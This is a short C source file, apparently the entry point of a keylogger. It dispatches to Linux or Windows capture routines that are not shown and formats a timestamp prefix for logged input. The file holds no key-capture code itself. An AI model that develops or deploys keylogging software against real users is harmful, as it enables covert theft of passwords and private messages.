#include<stdio.h>
#include<time.h>
#include<string.h>
#include"keylogger.h"

int main(void)
{
	#ifdef linux

	klinux();

	#elif WIN32

	kwindows();

	#endif

	return 0;
}

void format_time(char *time_variable)
{
	/** C Program To print Time **/
   	time_t rawtime;

  	struct tm * timeinfo;

	time (&rawtime);

  	timeinfo = localtime ( &rawtime );

	strcpy(time_variable,"Time: ");

	strcat(time_variable,asctime(timeinfo));

	/** https://stackoverflow.com/questions/5141960/get-the-current-time-in-c **/

	int size = strlen(time_variable);

	time_variable[size-1] = '\0';

	strcat(time_variable ," Input:");
}
